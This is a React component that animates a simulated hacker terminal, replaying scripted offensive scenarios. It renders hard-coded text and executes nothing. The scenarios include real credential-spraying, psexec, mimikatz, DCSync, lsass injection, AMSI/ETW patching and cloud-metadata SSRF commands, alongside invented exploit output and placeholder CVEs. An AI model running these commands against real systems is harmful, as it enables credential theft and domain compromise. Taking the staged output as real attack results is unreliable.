import React, { useState, useEffect, useRef } from 'react';
import { Play, Pause, RotateCcw, Skull, Terminal as TerminalIcon, Activity } from 'lucide-react';
import { Button } from '@/components/ui/button';

interface Command {
    command: string;
    output: string[];
    delay: number;
    type?: 'success' | 'warning' | 'error' | 'info';
}

interface Scenario {
    name: string;
    description: string;
    difficulty: 'Advanced' | 'Expert' | 'APT';
    commands: Command[];
}

const advancedScenarios: Scenario[] = [
    {
        name: "🎯 APT Lateral Movement",
        description: "Advanced Persistent Threat - Domain Takeover",
        difficulty: "APT",
        commands: [
            {
                command: "crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success",
                output: [
                    "SMB         10.10.10.50    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL)",
                    "SMB         10.10.10.50    445    DC01             [+] CORP.LOCAL\\admin:P@ssw0rd (Pwn3d!)",
                    "SMB         10.10.10.51    445    WEB01            [+] CORP.LOCAL\\admin:P@ssw0rd",
                    "SMB         10.10.10.52    445    SQL01            [+] CORP.LOCAL\\admin:P@ssw0rd"
                ],
                delay: 2000,
                type: 'success'
            },
            {
                command: "impacket-psexec CORP.LOCAL/admin:P@ssw0rd@10.10.10.50",
                output: [
                    "[*] Requesting shares on 10.10.10.50.....",
                    "[*] Found writable share ADMIN$",
                    "[*] Uploading file payload.exe",
                    "[*] Opening SVCManager on 10.10.10.50.....",
                    "[*] Creating service payload on 10.10.10.50.....",
                    "[*] Starting service payload.....",
                    "[!] Press help for extra shell commands",
                    "Microsoft Windows [Version 10.0.17763.1]",
                    "(c) 2018 Microsoft Corporation. All rights reserved.",
                    "",
                    "C:\\Windows\\system32>"
                ],
                delay: 2500,
                type: 'success'
            },
            {
                command: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
                output: [
                    "  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022",
                    " .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)",
                    " ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )",
                    " ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz",
                    " '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )",
                    "  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/",
                    "",
                    "mimikatz(commandline) # privilege::debug",
                    "Privilege '20' OK",
                    "",
                    "mimikatz(commandline) # sekurlsa::logonpasswords",
                    "Authentication Id : 0 ; 996 (00000000:000003e4)",
                    "Session           : Service from 0",
                    "User Name         : CORP$",
                    "Domain            : WORKGROUP",
                    "Logon Server      : (null)",
                    "Logon Time        : 2/15/2026 3:29:20 PM",
                    "SID               : S-1-5-20",
                    "        msv :",
                    "         [00000003] Primary",
                    "         * Username : Administrator",
                    "         * Domain   : CORP",
                    "         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c",
                    "         * SHA1     : 3f4d6c8e9a2b1c5d7e8f9a0b1c2d3e4f5a6b7c8d"
                ],
                delay: 3000,
                type: 'warning'
            },
            {
                command: "impacket-dcsync CORP.LOCAL/Administrator@10.10.10.50 -hashes :8846f7eaee8fb117ad06bdd830b7586c",
                output: [
                    "[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)",
                    "[*] Using the DRSUAPI method to get NTDS.DIT secrets",
                    "Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::",
                    "Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
                    "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d:::",
                    "[*] Kerberos keys grabbed",
                    "Administrator:aes256-cts-hmac-sha1-96:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
                    "[*] Cleaning up..."
                ],
                delay: 2500,
                type: 'success'
            },
            {
                command: "echo '[+] Domain Compromised - Full Control Achieved'",
                output: [
                    "[+] Domain Compromised - Full Control Achieved",
                    "[+] Credentials: 245 users dumped",
                    "[+] Golden Ticket: krbtgt hash obtained",
                    "[+] Persistence: Multiple backdoors installed",
                    "[+] Exfiltration: Data staged for transfer"
                ],
                delay: 1500,
                type: 'success'
            }
        ]
    },
    {
        name: "💀 Zero-Day Exploit Chain",
        description: "Browser → Sandbox Escape → Kernel Exploit",
        difficulty: "Expert",
        commands: [
            {
                command: "python3 browser_exploit.py --target http://victim.com --cve CVE-2024-XXXX",
                output: [
                    "[*] Initializing exploit for CVE-2024-XXXX (Chrome V8 UAF)",
                    "[*] Crafting malicious JavaScript payload",
                    "[*] Heap spray: 0x1000 objects allocated",
                    "[*] Triggering vulnerability...",
                    "[+] UAF triggered successfully!",
                    "[*] Leaking heap address: 0x2a4f8d90000",
                    "[*] Bypassing ASLR...",
                    "[+] Code execution achieved in renderer process",
                    "[*] Shellcode injected at 0x2a4f8d90100"
                ],
                delay: 3000,
                type: 'success'
            },
            {
                command: "python3 sandbox_escape.py --pid 1337",
                output: [
                    "[*] Targeting Chrome sandbox (PID: 1337)",
                    "[*] Exploiting IPC message handling (CVE-2024-YYYY)",
                    "[*] Crafting malicious Mojo message",
                    "[*] Sending IPC message to browser process...",
                    "[+] Sandbox escape successful!",
                    "[*] Now running in browser process context",
                    "[*] Privileges: Medium Integrity Level"
                ],
                delay: 2500,
                type: 'success'
            },
            {
                command: "python3 kernel_exploit.py --technique uaf --target win32k.sys",
                output: [
                    "[*] Loading kernel exploit (CVE-2024-ZZZZ)",
                    "[*] Target: win32k.sys (Windows Kernel)",
                    "[*] Technique: Use-After-Free in NtUserSetWindowFNID",
                    "[*] Allocating kernel objects...",
                    "[*] Triggering UAF condition...",
                    "[+] UAF triggered! Kernel object freed",
                    "[*] Heap spraying kernel pool...",
                    "[*] Reclaiming freed object with controlled data",
                    "[+] Kernel object reclaimed!",
                    "[*] Building ROP chain to disable SMEP...",
                    "[*] ROP gadgets: 0xfffff80012345678, 0xfffff8001234abcd",
                    "[+] SMEP disabled (CR4 modified)",
                    "[*] Executing kernel shellcode...",
                    "[+] Shellcode executed in Ring 0!",
                    "[*] Escalating privileges: UID 0 → SYSTEM",
                    "[+] SYSTEM privileges obtained!",
                    "",
                    "NT AUTHORITY\\SYSTEM"
                ],
                delay: 4000,
                type: 'success'
            },
            {
                command: "whoami /all",
                output: [
                    "USER INFORMATION",
                    "----------------",
                    "User Name           SID",
                    "=================== ========",
                    "nt authority\\system S-1-5-18",
                    "",
                    "PRIVILEGES INFORMATION",
                    "----------------------",
                    "Privilege Name                  Description                    State",
                    "=============================== ============================== ========",
                    "SeDebugPrivilege                Debug programs                 Enabled",
                    "SeBackupPrivilege               Back up files and directories  Enabled",
                    "SeRestorePrivilege              Restore files and directories  Enabled",
                    "SeTakeOwnershipPrivilege        Take ownership of files        Enabled",
                    "SeLoadDriverPrivilege           Load and unload device drivers Enabled"
                ],
                delay: 2000,
                type: 'success'
            }
        ]
    },
    {
        name: "🔓 Advanced EDR Bypass",
        description: "Direct Syscalls + Process Injection + Unhooking",
        difficulty: "Expert",
        commands: [
            {
                command: "python3 edr_bypass.py --technique direct-syscall --target lsass.exe",
                output: [
                    "[*] EDR Bypass Framework v2.0",
                    "[*] Target Process: lsass.exe (PID: 668)",
                    "[*] Detected EDR: CrowdStrike Falcon",
                    "[*] Technique: Direct Syscalls + Heaven's Gate",
                    "",
                    "[*] Step 1: Unhooking NTDLL.dll",
                    "[+] Reading clean NTDLL from disk",
                    "[+] Mapping clean NTDLL to memory",
                    "[+] Restoring .text section (size: 0x1A2000)",
                    "[+] NTDLL unhooked successfully!",
                    "",
                    "[*] Step 2: Resolving syscall numbers",
                    "[+] NtOpenProcess: 0x26",
                    "[+] NtAllocateVirtualMemory: 0x18",
                    "[+] NtWriteVirtualMemory: 0x3A",
                    "[+] NtCreateThreadEx: 0xC1"
                ],
                delay: 3000,
                type: 'info'
            },
            {
                command: "./syscall_inject --pid 668 --shellcode beacon.bin",
                output: [
                    "[*] Using direct syscalls to bypass EDR hooks",
                    "[*] Syscall: NtOpenProcess(PID: 668)",
                    "[+] Process handle obtained: 0x1234",
                    "",
                    "[*] Syscall: NtAllocateVirtualMemory(RWX)",
                    "[+] Memory allocated: 0x7FFE12340000 (size: 4096 bytes)",
                    "",
                    "[*] Syscall: NtWriteVirtualMemory(shellcode)",
                    "[+] Shellcode written (1024 bytes)",
                    "",
                    "[*] Syscall: NtCreateThreadEx(remote thread)",
                    "[+] Remote thread created: TID 4567",
                    "[+] Thread started at: 0x7FFE12340000",
                    "",
                    "[+] Injection successful! EDR bypassed.",
                    "[*] Beacon callback received from 10.10.10.50"
                ],
                delay: 2500,
                type: 'success'
            },
            {
                command: "python3 amsi_bypass.py && python3 etw_patch.py",
                output: [
                    "[*] AMSI Bypass",
                    "[+] Located AmsiScanBuffer: 0x7FFE1A2B3C4D",
                    "[+] Patching with 'mov eax, 0x80070057; ret'",
                    "[+] AMSI disabled!",
                    "",
                    "[*] ETW Patching",
                    "[+] Located EtwEventWrite: 0x7FFE2B3C4D5E",
                    "[+] Patching with 'ret' (0xC3)",
                    "[+] ETW telemetry disabled!",
                    "",
                    "[+] All security controls bypassed",
                    "[+] Operating in stealth mode"
                ],
                delay: 2000,
                type: 'success'
            }
        ]
    },
    {
        name: "💉 Modern Web Exploitation",
        description: "GraphQL Introspection → JWT IDOR → Cloud SSRF",
        difficulty: "Expert",
        commands: [
            {
                command: "python3 web_audit.py --target https://api.corp.local --verify-graphql",
                output: [
                    "[*] Target: https://api.corp.local",
                    "[*] Testing for GraphQL Introspection...",
                    "[+] Introspection enabled! Dumping schema...",
                    "[*] Found 42 types and 128 fields",
                    "[*] Sensitive Mutation Found: 'updateUserPrivileges'",
                    "[*] Sensitive Query Found: 'debugExportLogs(path: String!)'"
                ],
                delay: 2000,
                type: 'info'
            },
            {
                command: "python3 jwt_tool.py --token [JWT_TOKEN] --attack idor --uid 1",
                output: [
                    "[*] Original UID: 1042 (User)",
                    "[*] Attempting JWT header injection (alg: None)...",
                    "[*] Testing Secret Brute-force (top 10k)...",
                    "[+] JWT Key found: 's3cr3t_p@ss_2024'",
                    "[*] Forging new token for UID: 1 (Admin)",
                    "[+] Admin token generated successfully!",
                    "[*] Session hijacked with administrative privileges"
                ],
                delay: 2500,
                type: 'success'
            },
            {
                command: "python3 graphql_exploit.py --mutation updateUserPrivileges --args \"id:1042, role:ADMIN\"",
                output: [
                    "[*] Executing privileged mutation...",
                    "[*] Requesting: mutation { updateUserPrivileges(id: 1042, role: ADMIN) { success } }",
                    "[+] Mutation successful! Account upgraded to Site Admin",
                    "[*] Accessing restricted /admin/dashboard..."
                ],
                delay: 2000,
                type: 'success'
            },
            {
                command: "python3 ssrf_cloud.py --url https://api.corp.local/debug?url=http://169.254.169.254/latest/meta-data/",
                output: [
                    "[*] Testing SSRF on /debug endpoint...",
                    "[*] Targeting AWS Metadata Service (IMDSv1)",
                    "[+] Metadata service reached!",
                    "[*] Extracting IAM Role: 'Production-Web-Role'",
                    "[*] AccessKeyId:     AKIA2V4G7H8I9J0K1L2M",
                    "[*] SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                    "[*] Token:           IQoJb3JpZ2luX2VjEBoaCXVzLWVhc3QtMS...",
                    "",
                    "[+] AWS Cloud credentials successfully exfiltrated!"
                ],
                delay: 3500,
                type: 'success'
            }
        ]
    },
    {
        name: "🕵️ Threat Hunting & IR",
        description: "Memory Forensics → Beacon Detection → Remediation",
        difficulty: "Expert",
        commands: [
            {
                command: "volatility -f memory.dmp --profile Win10x64_19041 malfind",
                output: [
                    "[*] Scanning memory dump for injected code (VAD tags: PAGE_EXECUTE_READWRITE)",
                    "",
                    "Process: explorer.exe (PID: 3440)",
                    "Address: 0x7ffd12340000",
                    "Hexdump: 4d 5a 90 00 03 00 00 00 ... [ MZ Header Found ]",
                    "",
                    "[!] Suspicious MZ header detected in non-file-backed memory",
                    "[*] Dumping suspicious segment to file: suspicious_3440.bin"
                ],
                delay: 3000,
                type: 'warning'
            },
            {
                command: "python3 beacon_config_scan.py --file suspicious_3440.bin",
                output: [
                    "[*] Searching for Cobalt Strike Beacon configuration fingerprints...",
                    "[+] Fingerprint Match: Cobalt Strike 4.x Beacon",
                    "",
                    "CONFIGURATION DATA:",
                    "-------------------",
                    "C2 Server:   https://cdn.updates-microsoft.com/static/js",
                    "Port:        443",
                    "Sleeptime:   60000 ms",
                    "Jitter:      20%",
                    "User Agent:  Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
                    "PublicKey:   05a2bc84f... [ Redacted ]"
                ],
                delay: 2500,
                type: 'info'
            },
            {
                command: "python3 ir_remediate.py --pid 3440 --c2 https://cdn.updates-microsoft.com",
                output: [
                    "[*] Initializing Incident Response Workflow",
                    "[*] Step 1: Isolating host 10.10.20.15 via EDR",
                    "[+] Network isolation active!",
                    "[*] Step 2: Terminating malicious PID 3440 (explorer.exe injection)",
                    "[+] Process terminated",
                    "[*] Step 3: Removing persistence (Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)",
                    "[+] Found entry 'OneDriveUpdate' -> cmd.exe /c start beacon.exe",
                    "[+] Persistence entry deleted",
                    "[*] Step 4: Scanning for lateral movement attempts...",
                    "[+] Clean. No further infection points found on local subnet.",
                    "",
                    "[+] Incident Contained. Root cause analysis generated."
                ],
                delay: 4000,
                type: 'success'
            }
        ]
    }
];

const AdvancedLiveTerminal: React.FC = () => {
    const [selectedScenario, setSelectedScenario] = useState(0);
    const [isPlaying, setIsPlaying] = useState(false);
    const [currentCommandIndex, setCurrentCommandIndex] = useState(0);
    const [displayedText, setDisplayedText] = useState('');
    const [isTyping, setIsTyping] = useState(false);
    const [terminalHistory, setTerminalHistory] = useState<Array<{ command: string; output: string[]; type?: string }>>([]);
    const terminalRef = useRef<HTMLDivElement>(null);

    const currentScenario = advancedScenarios[selectedScenario];

    // Auto-scroll to bottom
    useEffect(() => {
        if (terminalRef.current) {
            terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
        }
    }, [terminalHistory, displayedText]);

    // Command Simulation Effect
    useEffect(() => {
        if (!isPlaying || currentCommandIndex >= currentScenario.commands.length) {
            if (currentCommandIndex >= currentScenario.commands.length) {
                setIsPlaying(false);
            }
            return;
        }

        const currentCommand = currentScenario.commands[currentCommandIndex];

        // Type command
        setIsTyping(true);
        let charIndex = 0;
        const typingInterval = setInterval(() => {
            if (charIndex <= currentCommand.command.length) {
                setDisplayedText(currentCommand.command.slice(0, charIndex));
                charIndex++;
            } else {
                clearInterval(typingInterval);
                setIsTyping(false);

                // Show output after delay
                setTimeout(() => {
                    setTerminalHistory(prev => [...prev, {
                        command: currentCommand.command,
                        output: currentCommand.output,
                        type: currentCommand.type
                    }]);
                    setDisplayedText('');
                    setCurrentCommandIndex(prev => prev + 1);
                }, 500);
            }
        }, 30);

        return () => clearInterval(typingInterval);
    }, [isPlaying, currentCommandIndex, currentScenario]);

    const handlePlay = () => {
        if (currentCommandIndex >= currentScenario.commands.length) {
            handleReset();
        }
        setIsPlaying(true);
    };

    const handlePause = () => {
        setIsPlaying(false);
    };

    const handleReset = () => {
        setIsPlaying(false);
        setCurrentCommandIndex(0);
        setDisplayedText('');
        setTerminalHistory([]);
    };

    const handleScenarioChange = (index: number) => {
        setSelectedScenario(index);
        handleReset();
    };

    const getDifficultyColor = (difficulty: string) => {
        switch (difficulty) {
            case 'Advanced': return '#f59e0b';
            case 'Expert': return '#ef4444';
            case 'APT': return '#8b5cf6';
            default: return '#10b981';
        }
    };

    const getTypeColor = (type?: string) => {
        switch (type) {
            case 'success': return 'text-green-500';
            case 'warning': return 'text-yellow-500';
            case 'error': return 'text-red-500';
            case 'info': return 'text-cyan-500';
            default: return 'text-green-500/80';
        }
    };

    return (
        <div className="w-full max-w-6xl mx-auto space-y-6">
            {/* Scenario Selector */}
            <div className="relative">
                <div className="flex gap-3 overflow-x-auto pb-4 pt-1 px-1 custom-scrollbar">
                    {advancedScenarios.map((scenario, index) => (
                        <button
                            key={index}
                            onClick={() => handleScenarioChange(index)}
                            className={`flex-shrink-0 px-5 py-3 rounded-lg text-sm font-semibold transition-all duration-300 transform ${selectedScenario === index
                                ? 'bg-primary text-primary-foreground shadow-[0_0_20px_rgba(var(--primary),0.3)] scale-105 border-primary z-10'
                                : 'bg-secondary/40 text-secondary-foreground hover:bg-secondary/60 border border-white/5 hover:border-white/20'
                                }`}
                        >
                            <div className="flex flex-col items-start gap-1">
                                <div className="flex items-center gap-2">
                                    <span className="text-base">{scenario.name.split(' ')[0]}</span>
                                    <span className="font-bold">{scenario.name.split(' ').slice(1).join(' ')}</span>
                                </div>
                                <div className="flex items-center gap-2 mt-1">
                                    <span
                                        className="text-[90%] px-2 py-0.5 rounded-md font-bold uppercase tracking-wider"
                                        style={{
                                            backgroundColor: `${getDifficultyColor(scenario.difficulty)}20`,
                                            color: getDifficultyColor(scenario.difficulty),
                                            border: `1px solid ${getDifficultyColor(scenario.difficulty)}30`
                                        }}
                                    >
                                        {scenario.difficulty}
                                    </span>
                                    {scenario.name.includes('Threat') || scenario.name.includes('EDR') ? (
                                        <span className="text-[9px] bg-blue-500/20 text-blue-400 border border-blue-500/30 px-1.5 py-0.5 rounded font-bold uppercase">Defense</span>
                                    ) : (
                                        <span className="text-[9px] bg-red-500/20 text-red-400 border border-red-500/30 px-1.5 py-0.5 rounded font-bold uppercase">Offense</span>
                                    )}
                                </div>
                            </div>
                        </button>
                    ))}
                </div>
                {/* Right fade indicator */}
                <div className="absolute right-0 top-0 bottom-4 w-12 bg-gradient-to-l from-background to-transparent pointer-events-none" />
            </div>

            {/* Terminal Window */}
            <div className="relative group">
                <div className="absolute -inset-1 bg-gradient-to-r from-red-500/20 to-purple-500/20 rounded-xl blur opacity-25 group-hover:opacity-50 transition duration-1000"></div>

                <div className="relative terminal-window border border-white/10 shadow-2xl rounded-xl overflow-hidden backdrop-blur-md">
                    {/* Terminal Header */}
                    <div className="flex items-center justify-between px-5 py-3.5 border-b border-white/5 bg-black/40">
                        <div className="flex items-center gap-3">
                            <div className="flex gap-1.5">
                                <div className="w-3 h-3 rounded-full bg-red-500/60 shadow-[0_0_8px_rgba(239,68,68,0.4)]"></div>
                                <div className="w-3 h-3 rounded-full bg-yellow-500/60 shadow-[0_0_8px_rgba(234,179,8,0.4)]"></div>
                                <div className="w-3 h-3 rounded-full bg-green-500/60 shadow-[0_0_8px_rgba(34,197,94,0.4)]"></div>
                            </div>
                            <div className="h-4 w-px bg-white/10 mx-1"></div>
                            <Skull className="h-4 w-4" style={{ color: getDifficultyColor(currentScenario.difficulty) }} />
                            <span className="text-xs text-white/60 font-mono tracking-wide truncate max-w-[200px] md:max-w-md">
                                {currentScenario.description}
                            </span>
                        </div>

                        {/* Controls */}
                        <div className="flex items-center gap-3">
                            <div className="flex items-center bg-black/60 rounded-lg p-1 border border-white/5">
                                {!isPlaying ? (
                                    <Button
                                        size="sm"
                                        variant="ghost"
                                        onClick={handlePlay}
                                        className="h-8 px-3 text-green-500 hover:text-green-400 hover:bg-green-500/10 transition-all"
                                    >
                                        <Play className="h-3.5 w-3.5 mr-2" fill="currentColor" />
                                        <span className="text-[10px] font-bold uppercase tracking-tighter">Execute</span>
                                    </Button>
                                ) : (
                                    <Button
                                        size="sm"
                                        variant="ghost"
                                        onClick={handlePause}
                                        className="h-8 px-3 text-yellow-500 hover:text-yellow-400 hover:bg-yellow-500/10 transition-all"
                                    >
                                        <Pause className="h-3.5 w-3.5 mr-2" fill="currentColor" />
                                        <span className="text-[10px] font-bold uppercase tracking-tighter">Halt</span>
                                    </Button>
                                )}
                                <div className="w-px h-4 bg-white/10 mx-1"></div>
                                <Button
                                    size="sm"
                                    variant="ghost"
                                    onClick={handleReset}
                                    className="h-8 w-8 p-0 text-white/60 hover:text-white hover:bg-white/5 transition-all"
                                    title="Reset Terminal"
                                >
                                    <RotateCcw className="h-3.5 w-3.5" />
                                </Button>
                            </div>
                        </div>
                    </div>

                    {/* Terminal Content */}
                    <div
                        ref={terminalRef}
                        className="p-6 h-[500px] overflow-y-auto font-mono text-sm space-y-3 bg-black/95 relative selection:bg-red-500/30"
                    >
                        <div className="scanlines-overlay pointer-events-none" />

                        {/* Initial Prompt */}
                        <div className="flex items-center gap-2 mb-4">
                            <span className="text-red-500 font-bold">root@kali</span>
                            <span className="text-blue-400">~</span>
                            <span className="text-green-500">#</span>
                            <span className="text-white/40 italic text-xs animate-pulse">
                                Ready for operation. Select a scenario and press Execute.
                            </span>
                        </div>

                        {/* History */}
                        {terminalHistory.map((entry, index) => (
                            <div key={index} className="space-y-2 animate-fade-in">
                                <div className="flex items-center gap-2">
                                    <span className="text-red-500 font-bold">root@kali</span>
                                    <span className="text-blue-400">~</span>
                                    <span className="text-green-500">#</span>
                                    <span className="text-cyan-400 font-bold">{entry.command}</span>
                                </div>
                                <div className="space-y-0.5 ml-4 border-l border-white/5 pl-4">
                                    {entry.output.map((line, lineIndex) => (
                                        <div key={lineIndex} className={`leading-relaxed ${getTypeColor(entry.type)}`}>
                                            {line}
                                        </div>
                                    ))}
                                </div>
                            </div>
                        ))}

                        {/* Current typing command */}
                        {isTyping && (
                            <div className="flex items-center gap-2 pt-2">
                                <span className="text-red-500 font-bold">root@kali</span>
                                <span className="text-blue-400">~</span>
                                <span className="text-green-500">#</span>
                                <span className="text-cyan-400 font-bold">
                                    {displayedText}
                                    <span className="terminal-cursor inline-block w-2.5 h-4.5 bg-green-500/80 ml-1 translate-y-0.5"></span>
                                </span>
                            </div>
                        )}

                        {/* Idle cursor */}
                        {!isTyping && (
                            <div className="flex items-center gap-2 pt-2">
                                <span className="text-red-500 font-bold">root@kali</span>
                                <span className="text-blue-400">~</span>
                                <span className="text-green-500">#</span>
                                <span className="terminal-cursor inline-block w-2.5 h-4.5 bg-green-500/80 ml-1 translate-y-0.5"></span>
                            </div>
                        )}
                    </div>
                </div>
            </div>

            {/* Scenario Stats */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="bg-black/40 border border-white/5 rounded-xl p-5 backdrop-blur-sm transition-all hover:bg-black/60 hover:border-white/10">
                    <div className="flex items-center justify-between mb-2">
                        <span className="text-xs text-white/40 font-bold uppercase tracking-wider">Risk Level</span>
                        <Skull className="h-4 w-4" style={{ color: getDifficultyColor(currentScenario.difficulty) }} />
                    </div>
                    <div className="text-2xl font-black italic tracking-tighter" style={{ color: getDifficultyColor(currentScenario.difficulty) }}>
                        {currentScenario.difficulty}
                    </div>
                </div>

                <div className="bg-black/40 border border-white/5 rounded-xl p-5 backdrop-blur-sm transition-all hover:bg-black/60 hover:border-white/10">
                    <div className="flex items-center justify-between mb-2">
                        <span className="text-xs text-white/40 font-bold uppercase tracking-wider">Complexity</span>
                        <TerminalIcon className="h-4 w-4 text-primary" />
                    </div>
                    <div className="text-2xl font-black italic tracking-tighter text-primary">
                        {currentScenario.commands.length} STAGES
                    </div>
                </div>

                <div className="bg-black/40 border border-white/5 rounded-xl p-5 backdrop-blur-sm transition-all hover:bg-black/60 hover:border-white/10">
                    <div className="flex items-center justify-between mb-2">
                        <span className="text-xs text-white/40 font-bold uppercase tracking-wider">Mission Progress</span>
                        <Activity className="h-4 w-4 text-green-500" />
                    </div>
                    <div className="flex items-end gap-2">
                        <div className="text-2xl font-black italic tracking-tighter text-green-500">
                            {Math.round((currentCommandIndex / currentScenario.commands.length) * 100)}%
                        </div>
                        <div className="text-xs text-white/20 mb-1 font-mono">
                            [{currentCommandIndex}/{currentScenario.commands.length}]
                        </div>
                    </div>
                    <div className="mt-3 w-full bg-white/5 h-1 rounded-full overflow-hidden">
                        <div
                            className="h-full bg-green-500 transition-all duration-500"
                            style={{ width: `${(currentCommandIndex / currentScenario.commands.length) * 100}%` }}
                        />
                    </div>
                </div>
            </div>

            <style>{`
                .custom-scrollbar::-webkit-scrollbar {
                    height: 5px;
                }
                .custom-scrollbar::-webkit-scrollbar-track {
                    background: rgba(255, 255, 255, 0.02);
                    border-radius: 10px;
                }
                .custom-scrollbar::-webkit-scrollbar-thumb {
                    background: rgba(var(--primary), 0.3);
                    border-radius: 10px;
                }
                .custom-scrollbar::-webkit-scrollbar-thumb:hover {
                    background: rgba(var(--primary), 0.5);
                }
                
                .scanlines-overlay {
                    position: absolute;
                    inset: 0;
                    background: linear-gradient(
                        to bottom,
                        transparent 50%,
                        rgba(0, 0, 0, 0.1) 50%
                    );
                    background-size: 100% 4px;
                    pointer-events: none;
                    z-index: 10;
                }
                
                .terminal-cursor {
                    animation: blink 1s step-end infinite;
                }
                
                @keyframes blink {
                    0%, 100% { opacity: 1; }
                    50% { opacity: 0; }
                }

                .animate-fade-in {
                    animation: fadeIn 0.3s ease-out forwards;
                }

                @keyframes fadeIn {
                    from { opacity: 0; transform: translateY(5px); }
                    to { opacity: 1; transform: translateY(0); }
                }
            `}</style>
        </div>
    );
};

export default AdvancedLiveTerminal;
